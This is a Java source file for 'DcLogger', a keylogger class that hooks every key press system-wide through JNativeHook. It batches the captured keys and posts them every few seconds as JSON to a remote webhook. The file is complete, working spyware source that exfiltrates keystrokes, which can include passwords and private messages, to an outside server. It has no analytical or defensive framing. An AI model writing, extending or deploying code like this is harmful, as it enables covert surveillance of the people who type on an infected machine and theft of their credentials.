package me.lyzev.dclogger;

import com.google.gson.JsonObject;
import me.lyzev.dclogger.utils.Timer;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

/**
 * This file is part of DcLogger.
 * Copyright (c) 2021 Lyzev.
 *
 * @author Lyzev
 * @date 3/11/2022
 * @project DcLogger
 * @package me.lyzev.dclogger
 */
public class KeyLogger implements NativeKeyListener {

    private final List<String> keys = new ArrayList<>(); // Pressed keys that haven't been sent to the webhook yet
    private final Timer timer = new Timer(); // Timer for the interval, so there are not to many request to the webhook

    private final URL webhook; // The webhook to which the keys are going to be sent
    private final long interval; // The time in ms(=milliseconds) between every webhook request

    /**
     * A constructor with an interval of 5000ms.
     *
     * @param webhook the webhook to which the keys are going to be sent
     * @throws MalformedURLException the exception is going to be thrown if the url is incorrect
     */
    public KeyLogger(String webhook) throws MalformedURLException {
        this(webhook, 5000L);
    }

    /**
     * A constructor where you can specify a custom interval.
     *
     * @param webhook  the webhook to which the keys are going to be sent
     * @param interval the time in ms(=milliseconds) between every webhook request
     * @throws MalformedURLException the exception is going to be thrown if the url is incorrect
     */
    public KeyLogger(String webhook, long interval) throws MalformedURLException {
        this.webhook = new URL(webhook);
        if (interval < 0)
            throw new IllegalArgumentException(String.format("The provided interval must be greater or equals 0. [interval = %d]", interval));
        this.interval = interval;
    }

    /**
     * Starts the keylogger / Registers the keylogger
     */
    public void start() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(this);
    }

    /**
     * Stops the keylogger / Unregisters the keylogger
     */
    public void stop() {
        GlobalScreen.removeNativeKeyListener(this);
    }

    /**
     * Sends all keys in {@link KeyLogger#keys} to the webhook.
     */
    private void send() {
        if (keys.isEmpty()) // Returns if there are no keys to send
            return;
        JsonObject data = new JsonObject(); // Creates a json object for the webhook
        data.addProperty("content", "**" + new Date() + ":**\n[`" + String.join("`] [`", keys) + "`]"); // Sets the content of the webhook
        data.addProperty("username", "DcLogger by Lyzev"); // Sets the username of the webhook
        try {
            HttpURLConnection con = (HttpURLConnection) webhook.openConnection(); // Connects to the webhook
            con.setRequestMethod("POST"); // Request is POST, because we want to send upload data
            con.addRequestProperty("Content-Type", "application/json"); // Conent-Type is json, because where are going to send the webhook as a json
            con.setDoOutput(true);
            OutputStream out = con.getOutputStream(); // Gets the output stream of the connection to send data
            out.write(data.toString().getBytes(StandardCharsets.UTF_8)); // Sends the json encoded bytes
            out.flush(); // Flushes this output stream and forces any buffered output bytes to be written out
            out.close(); // Closes this output stream and releases any system resources associated with this stream
            System.out.println("Response-Code: " + con.getResponseCode()); // Prints the response code
            con.disconnect(); // Disconnect from the connection
            keys.clear(); // Clears the key list
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Adds the pressed key to {@link KeyLogger#keys}. (This method will only be called if the keylogger is registered.)
     *
     * @param e the event
     */
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        keys.add(NativeKeyEvent.getKeyText(e.getKeyCode())); // Adds the pressed key to the list
        if (timer.hasTimeElapsed(interval, true)) // Checks if the interval time until the last webhook request has elapsed
            send(); // Sends all keys to the webhook
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
    } // IGNORE

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
    } // IGNORE

}
